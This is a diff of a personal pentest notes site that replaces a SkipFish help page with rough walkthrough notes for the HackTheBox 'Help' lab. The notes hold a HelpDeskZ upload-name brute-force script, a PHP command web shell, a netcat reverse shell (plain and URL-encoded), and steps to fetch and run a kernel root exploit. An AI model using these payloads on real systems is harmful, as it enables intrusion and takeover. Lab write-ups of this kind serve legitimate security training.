@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-06-08T12:50:23 EDT">
-<title>SkipFish :: DocDock Documentation</title>
+<meta name="revised" content="2019-06-08T12:50:21 EDT">
+<title> :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/tools/webapp/skipfish/">
+  <body data-url="/hackthebox/boxes/help/">
     
       <header>
   <div class="logo">
@@ -108,34 +108,6 @@
         <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
-<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
-        ">
-    <div>
-
-        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
-<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
-        ">
-    <div>
-
-        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
-<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
-        ">
-    <div>
-
-        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
-<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
-        ">
-    <div>
-
-        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
     </ul>
 </li>
 <li data-nav-id="/concepts/bypass/" class="dd-item">
@@ -154,18 +126,20 @@
 </li>
     </ul>
 </li>
-<li data-nav-id="/hackthebox/" class="dd-item haschildren
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/hackthebox/">HackTheBox</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
-<li data-nav-id="/hackthebox/boxes/" class="dd-item haschildren
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/hackthebox/boxes/">Boxes</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
@@ -175,7 +149,7 @@
         <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/help/" class="dd-item">
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item active">
     <div>
         <a href="/hackthebox/boxes/help/">
             
@@ -372,12 +346,11 @@
         <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/" class="dd-item parent haschildren
+<li data-nav-id="/tools/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/tools/">Tools</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/tools/bloodhound/" class="dd-item">
@@ -445,12 +418,11 @@
         <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/webapp/" class="dd-item parent haschildren
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/tools/webapp/">WebApps</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/tools/webapp/burp/" class="dd-item
@@ -467,7 +439,7 @@
         <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/webapp/skipfish/" class="dd-item parent active
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
         ">
     <div>
 
@@ -531,46 +503,69 @@
     <option value="/concepts/" >
    Concept</option>
     <option value="/hackthebox/" >
-   HackTheBox</option>
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+      <option value="/hackthebox/boxes/help/"  selected>-- </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
     <option value="/help/" >
    Network Manager Down</option>
     <option value="/tools/" >
-   Tools</option> 
-      <option value="/tools/bloodhound/" >- BloodHound Neo4j</option>
-      <option value="/tools/ftp/" >- FTP</option>
-    <option value="/tools/hydra/" >
-  - 
-   Hydra</option>
-      <option value="/tools/nmap/" >- Nmap</option>
-    <option value="/tools/portscanning/" >
-  - 
-   PortScannings</option>
-      <option value="/tools/smb/smb/" >- SMB</option>
-    <option value="/tools/snmpwalk/" >
-  - 
-   SNMPWalk</option>
-    <option value="/tools/webapp/" >
-  - 
-   WebApps</option> 
-    <option value="/tools/webapp/burp/" >
-  -- 
-   Burp</option>
-    <option value="/tools/webapp/gobuster/" >
-  -- 
-   GoBuster</option>
-    <option value="/tools/webapp/skipfish/"  selected>
-  -- 
-   SkipFish</option> 
-  
-      <option value="/tools/webapp/sqlmap/sqlmap/" >-- SqlMap</option>
-    <option value="/tools/webapp/wfuzz/" >
-  -- 
-   WFuzz</option>
-  
-    <option value="/tools/ssh/" >
-  - 
-   ssh</option>
-  
+   Tools</option>
 
 
 
@@ -593,97 +588,312 @@
       </div>
     
 
-    <h1>SkipFish</h1>
+    <h1></h1>
     
     
     
+    
 
-<p>SkipFish is a web app directory scanner that creates a neat report. it will recursively scan a web app and will look for ill regularities.</p>
-
-<pre><code>skipfish -h                                                                                                  [39/484]
-skipfish web application scanner - version 2.10b                                                                                                     
-Usage: skipfish [ options ... ] -W wordlist -o output_dir start_url [ start_url2 ... ]                                                               
-                                                                                                                                                     
-Authentication and access options:                                                                                                                   
-                                                                                                                                
-  -A user:pass      - use specified HTTP authentication credentials                                                                
-  -F host=IP        - pretend that 'host' resolves to 'IP'                                                                          
-  -C name=val       - append a custom cookie to all requests                                                                                   
-  -H name=val       - append a custom HTTP header to all requests                                                                                    
-  -b (i|f|p)        - use headers consistent with MSIE / Firefox / iPhone
-  -N                - do not accept any new cookies               
-  --auth-form url   - form authentication URL             
-  --auth-user user  - form authentication user                 
-  --auth-pass pass  - form authentication password                 
-  --auth-verify-url -  URL for in-session detection          
-                                               
-Crawl scope options:                                               
-                                                     
-  -d max_depth     - maximum crawl tree depth (16)
-  -c max_child     - maximum children to index per node (512)
-  -x max_desc      - maximum descendants to index per branch (8192)
-  -r r_limit       - max total number of requests to send (100000000)
-  -p crawl%        - node and link crawl probability (100%)
-  -q hex           - repeat probabilistic scan with given seed
-  -I string        - only follow URLs matching 'string'
-  -X string        - exclude URLs matching 'string'
-  -K string        - do not fuzz parameters named 'string'
-  -D domain        - crawl cross-site links to another domain
-  -B domain        - trust, but do not crawl, another domain
-  -Z               - do not descend into 5xx locations
-  -O               - do not submit any forms
-  -P               - do not parse HTML, etc, to find new links
-Reporting options:
-
-  -o dir          - write output to specified directory (required)
-  -M              - log warnings about mixed content / non-SSL passwords
-  -E              - log all HTTP/1.0 / HTTP/1.1 caching intent mismatches
-  -U              - log all external URLs and e-mails seen
-  -Q              - completely suppress duplicate nodes in reports
-  -u              - be quiet, disable realtime progress stats
-  -v              - enable runtime logging (to stderr)
-
-Dictionary management options:
-
-  -W wordlist     - use a specified read-write wordlist (required)
-  -S wordlist     - load a supplemental read-only wordlist
-  -L              - do not auto-learn new keywords for the site
-  -Y              - do not fuzz extensions in directory brute-force
-  -R age          - purge words hit more than 'age' scans ago
-  -T name=val     - add new form auto-fill rule
-  -G max_guess    - maximum number of keyword guesses to keep (256)
-
-  -z sigfile      - load signatures from this file
-
-Performance settings:
-
-  -g max_conn     - max simultaneous TCP connections, global (40)
-  -m host_conn    - max simultaneous connections, per target IP (10)
-  -f max_fail     - max number of consecutive HTTP errors (100)
-  -t req_tmout    - total request response timeout (20 s)
-  -w rw_tmout     - individual network I/O timeout (10 s)
-  -i idle_tmout   - timeout on idle HTTP connections (10 s)
-  -s s_limit      - response size limit (400000 B)
-  -e              - do not keep binary responses for reporting
-Other settings:
-
-  -l max_req      - max requests per second (0.000000)
-  -k duration     - stop scanning after the given duration h:m:s
-  --config file   - load the specified configuration file
-
-Send comments and complaints to &lt;heinenn@google.com&gt;.
+<pre><code>Modified from the Debian original for Ubuntu
+Last updated: 2014-03-19
 </code></pre>
 
-<p><a href="https://tools.kali.org/web-applications/skipfish">https://tools.kali.org/web-applications/skipfish</a></p>
+<p>so nmap reveals two ports, its running node js on an apache 2014 box, ssh seems up to date. initial go buster scans didn&rsquo;t give much on the serfuce but after enumerating support it revealed some more directories.</p>
 
+<pre><code># Nmap 7.70 scan initiated Mon Jan 21 19:30:29 2019 as: nmap -sC -sV -p- -Pn -T4 -oA total-help help.htb
+Nmap scan report for help.htb (10.10.10.121)
+Host is up (0.047s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre>
+
+<p>oh, wow, very clean and neat webpage.</p>
+
+<p><img src="C:UserscharlOneDrivePictureshacktheboxhelpwebpage-support.PNG" alt="webpage-support" /></p>
+
+<p>tried uploading a php reverse shell got some kind of filtering.</p>
+
+<p>php, php5 aren&rsquo;t allowed. one last test for file types because captcha blows</p>
+
+<p>could fuz the api which might be the easiest thing to do. like in mischief where you could bypass all that mobojumbo just by fuzzing possible functions</p>
+
+<h3 id="gobuster">Gobuster</h3>
+
+<p>=====================================================</p>
+
+<p>/index.html (Status: 200)<br />
+/support (Status: 301)<br />
+/javascript (Status: 301)</p>
+
+<h4 id="support">support</h4>
+
+<p>=====================================================</p>
+
+<pre><code>/images (Status: 301)                                                                               
+/uploads (Status: 301) 
+​   /articles (Status: 301)
+​   /tickets (Status: 301)                               
+/css (Status: 301)                        
+/includes (Status: 301)                                   
+/js (Status: 301)                                         
+/views (Status: 301)
+/controllers (Status: 301)
+</code></pre>
+
+<p>=====================================================</p>
+
+<p>HELPDESKZ</p>
+
+<p>examining r/controllers/submit_ticket_controller.php#L160  line 137 too 165. This part of the program deals with how the webapp uploads, names, verifies file type &amp; size. It produces an error but doesn&rsquo;t do anything with the uploaded file.  If its the right file type and meets the criteria it will notify send the ticket onward.</p>
+
+<p>lesson</p>
+
+<p>next time even if it produces a error check and make sure the file still wasn&rsquo;t uploaded.</p>
+
+<blockquote>
+<pre><code>&gt; isset determines if a variable is set &amp; not a NULL character. checks the error_msg the settings.
+&gt; if(!isset($error_msg) &amp;&amp; $settings['ticket_attachment']==1){
+&gt; Now it sets the variables UPLOAD_DIR /support/uploads/ this just attaches tickets/ to the end.
+&gt;                   $uploaddir = UPLOAD_DIR.'tickets/';     
+&gt; The next if statement is dealing with how the program handles errors and uploading a ticket.
+&gt;                   if($_FILES['attachment']['error'] == 0){
+&gt; Defining variables
+&gt; ext uses the PATHINFO_EXTENSION functions which will take the extention and figure out what kind of program it is.
+&gt;                   $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
+&gt; This names the file                       
+&gt;                       $filename = md5($_FILES['attachment']['name'].time()).&quot;.&quot;.$ext;
+&gt; This checks the uploaded file type and size
+&gt;                       $fileuploaded[] = array('name' =&gt; $_FILES['attachment']['name'], 'enc' =&gt; $filename, 'size' =&gt; formatBytes($_FILES['attachment']['size']), 'filetype' =&gt; $_FILES['attachment']['type']);
+&gt; this is the full path for the uploaded path
+&gt;                       $uploadedfile = $uploaddir.$filename;
+&gt; if the uploaded file doesn't produce errors move_uploaded_file is a function that moves a file. then it anayzes the file. i think the file is uploaded regarless if the verification fails or not. 
+&gt;                       if (!move_uploaded_file($_FILES['attachment']['tmp_name'],$uploadedfile)) {
+&gt;                           $show_step2 = true;
+&gt;                           $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
+&gt;                       }else{
+&gt;                           $fileverification = verifyAttachment($_FILES['attachment']);
+&gt; if it produces different answers it will print the text after $LANG
+&gt;                           switch($fileverification['msg_code']){
+&gt;                               case '1':
+&gt;                               $show_step2 = true;
+&gt;                               $error_msg = $LANG['INVALID_FILE_EXTENSION'];
+&gt;                               break;
+&gt;                               case '2':
+&gt;                               $show_step2 = true;
+&gt;                               $error_msg = $LANG['FILE_NOT_ALLOWED'];
+&gt;                               break;
+&gt;                               case '3':
+&gt;                               $show_step2 = true;
+&gt;                               $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
+&gt;                               break;
+&gt;                           }
+&gt;                       }
+&gt;                   }
+&gt; ```
+
+
+
+&quot;Something like it. But you can shorten the range by giving it something closer to the what the server time is. If you know the server is a certain time, no need for the loop to start at 0
+Right now, it is 3:25 PM for me. If I know the server time is 3:15 PM, I can safely start the loop around the 8 minute mark and stop probably around the 12 minute mark&quot;
+
+just a guess
+
+the first part checks for error with captcha. uploads the directory, then proceeds to define the variables. 
+ext variable defines the file extensions.PATHINFO_EXTENSION get the extension of a file if the file uses dots in the parameter name it will clean it up by returning the last extension.  php.jpg returns .jpg 
+
+FILENAME does the md5 stuff then sets the extension with the .ext variable. 
+file uploaded moves the file into the directory
+
+the last variable UPLOADEDFILE complete path for the uploaded file.
+second if statement
+move_uploaded_file if the forum was completed, lang checks against other languages. ​                         
+
+So it might produce an error it still leaves the file on the host.
+
+Editing the rce.py 
+
+### rce.py
+
+ is a python script that will try and predict the name of the suploadded file by using the system time of the server computer. I had orginally thought it was a time zone thing GMT time is 8 or 12 our ahead or behind but thats not the point.   
+
+&lt; Date: Wed, 23 Jan 2019 18:19:57 GMT 
+
+my time is 5 minutes off from the system clock.  5*60 = 300 just need to change the range in for x in range(250, 500): time.time() gmt time which is think is some kind of internal system clock. 
+
+</code></pre>
+
+<p>import hashlib
+import time
+import sys
+import requests</p>
+</blockquote>
+
+<p>print &lsquo;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&rsquo;</p>
+
+<p>if len(sys.argv) &lt; 3:
+    print &ldquo;Usage: {} [baseUrl] [nameOfUploadedFile]&ldquo;.format(sys.argv[0])
+    sys.exit(1)</p>
+
+<p>helpdeskzBaseUrl = sys.argv[1]
+fileName = sys.argv[2]
+currentTime = int(time.time())</p>
+
+<p>####for x in range(250, 500):#####</p>
+
+<pre><code>plaintext = fileName + str(currentTime - x)
+md5hash = hashlib.md5(plaintext).hexdigest()
+
+url = helpdeskzBaseUrl+md5hash+'.php'
+response = requests.head(url)
+if response.status_code == 200:
+    print &quot;found!&quot;
+    print url
+    sys.exit(0)
+</code></pre>
+
+<p>print &ldquo;Sorry, I did not find anything&rdquo;</p>
+
+<pre><code>
+
+
+#### upload simple-backdoor.php
+
+</code></pre>
+
+<p>locate simple-backdoor.php
+&lt;?php
+if(isset($_REQUEST[&lsquo;cmd&rsquo;])){
+        echo &ldquo;<pre>&rdquo;;
+        $cmd = ($_REQUEST[&lsquo;cmd&rsquo;]);
+        system($cmd);
+        echo &ldquo;</pre>&rdquo;;
+        die;
+}
+?&gt;
+Usage: <a href="http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd">http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</a></p>
+
+<pre><code>
+ippsec php-backdoor.php
+this one didn't work fully it would just hang
+
+&lt;?php system($_REQUEST['CMD']) ?&gt;
+
+query server nodejs json
+
+&lt; X-Powered-By: Express
+X-Powered-By: Express
+&lt; Content-Type: application/json; charset=utf-8
+Content-Type: application/json; charset=utf-8
+
+curl -v --head help.htb:3000
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 9051 &gt;/tmp/f
+
+url encode it either using the encoder or highlight right clicking in the repeater tab
+
+%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%31%34%20%39%30%35%31%20%3e%2f%74%6d%70%2f%66
+
+
+
+```bash
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'  
+python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'  
+</code></pre>
+
+<p>mv /tmp/passwd.bak /etc/passwd</p>
+
+<p>ROOT</p>
+
+<p>HISTORY</p>
+
+<p>rOOTmEoRdIE!</p>
+
+<p>find / -perm 4000- type f -exec ls -ld {} \; 2&gt;&amp;1 | grep -v &ldquo;denied&rdquo;</p>
+
+<p>cat /etc/cron*</p>
+
+<p>grep -rnw password /</p>
+
+<p>npm run build</p>
+
+<p>sudo shutdown</p>
+
+<p>ps -aux | grep root</p>
+
+<p>crontab -l</p>
+
+<p>reboot</p>
+
+<p>help      22991  0.0  0.0  96704   872 pts/2    Sl+  11:19   0:03 ./cowroot</p>
+
+<p>find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v &ldquo;Permission denied&rdquo;</p>
+
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+
+<pre><code>/usr/sbin/exim4
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/s-nail/s-nail-privsep
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/su
+/bin/ntfs-3g
+/bin/ping6
+/bin/mount
+/bin/umount
+/bin/fusermount
+/bin/ping
+
+</code></pre>
+
+<p><a href="https://www.hackingarticles.in/hack-the-trollcave-vm-boot-to-root/">https://www.hackingarticles.in/hack-the-trollcave-vm-boot-to-root/</a></p>
+
+<p><a href="https://askubuntu.com/questions/183515/how-do-i-find-the-kernel-version-ubuntu-release-and-disk-partition-information">https://askubuntu.com/questions/183515/how-do-i-find-the-kernel-version-ubuntu-release-and-disk-partition-information</a></p>
+
+<p><a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a></p>
+
+<p>Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>
+
+<p>python3 -m http.server 9058</p>
+
+<p>wget <a href="http://ip_addr:9058/chicken.c">http://ip_addr:9058/chicken.c</a></p>
+
+<p>you may also copy paste by encoding the code in base64 then decoding on the host machine.</p>
+
+<p>gcc chicken.c -o kernel</p>
+
+<p>chmod u+x kernel</p>
+
+<p>./kernel</p>
+
+<p>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambasha
+re),1000(help)</p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/tools/webapp/gobuster/" title="GoBuster"> <i class="fa fa-chevron-left"></i><label>GoBuster</label></a>
-    <a class="nav nav-next" href="/tools/webapp/sqlmap/sqlmap/" title="SqlMap" style="margin-right: 0px;"><label>SqlMap</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/hawk/" title=""> <i class="fa fa-chevron-left"></i><label></label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/blue/" title="Blue" style="margin-right: 0px;"><label>Blue</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -700,7 +910,7 @@ Send comments and complaints to &lt;heinenn@google.com&gt;.
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioTools/WebApp/skipfish/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/help.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
